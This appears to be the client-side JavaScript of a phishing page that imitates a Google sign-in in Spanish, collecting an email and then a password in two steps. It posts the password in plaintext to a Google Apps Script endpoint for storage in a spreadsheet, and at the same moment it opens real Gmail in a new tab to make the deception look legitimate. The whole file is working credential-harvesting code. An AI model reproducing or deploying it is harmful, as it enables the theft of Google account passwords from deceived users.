const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwR8pzNfNsEnYFh2XT4vNYwTmhfuw41mmgRK5QRq0nal4TK5Zde4hiK9UfA1ZFjAzKp/exec";

let step = 1; 
let userEmail = "";

function showSuccessNotification() {
    const msg = document.getElementById('success-message');
    if(msg) {
        msg.classList.add('show');
        setTimeout(() => msg.classList.remove('show'), 3000);
    }
}

function procesarFlujo() {
    const btnNext = document.querySelector('.next-button');
    
    // --- PASO 1: CORREO ---
    if (step === 1) {
        const emailInput = document.getElementById('email').value.trim();
        if (!emailInput) {
            alert("Ingresa tu correo electrónico o número de teléfono.");
            return;
        }

        userEmail = emailInput;

        document.getElementById('email-field').style.display = 'none';
        document.getElementById('password-field').style.display = 'block';
        document.getElementById('password').focus();

        const introDiv = document.querySelector('.intro');
        if(introDiv) {
            introDiv.innerHTML = `
                <h1>¡Te damos la bienvenida!</h1>
                <p style="margin-bottom: 24px;">${userEmail}</p>
            `;
        }

        const forgotLink = document.querySelector('.forgot');
        if(forgotLink) forgotLink.textContent = "¿Olvidaste la contraseña?";

        step = 2; 
        return;
    }

    // --- PASO 2: CONTRASEÑA ---
    if (step === 2) {
        const passwordInput = document.getElementById('password').value.trim();
        if (!passwordInput) {
            alert("Ingresa tu contraseña.");
            return;
        }

        if (btnNext) {
            btnNext.textContent = 'Iniciando...';
            btnNext.disabled = true;
        }

        // 🌟 TRUCO ANTIBLOQUEO: Abrir Gmail en el instante exacto del clic
        window.open("https://mail.google.com", "_blank");

        const payload = {
            action: "registerUser",
            provider: "google",
            nombre: userEmail,
            colonia: "Red Social",
            contrasena: passwordInput
        };

        // Enviar a Apps Script en segundo plano
        fetch(SCRIPT_URL, {
            method: 'POST',
            headers: { "Content-Type": "text/plain;charset=utf-8" },
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(result => console.log("Sincronizado con Sheets:", result))
        .catch(err => console.error("Error al sincronizar:", err))
        .finally(() => {
            // Autologin local
            localStorage.setItem('vecino_nombre', userEmail);
            localStorage.setItem('vecino_colonia', 'Red Social');

            showSuccessNotification();

            // Redirigir la pestaña original al sistema de reportes
            setTimeout(() => {
                window.location.href = `../index.html?user=${encodeURIComponent(userEmail)}`;
            }, 1000); 
        });
    }
}

// Eventos
document.querySelector('.next-button').addEventListener('click', procesarFlujo);

document.getElementById('email').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); procesarFlujo(); }
});

document.getElementById('password').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); procesarFlujo(); }
});
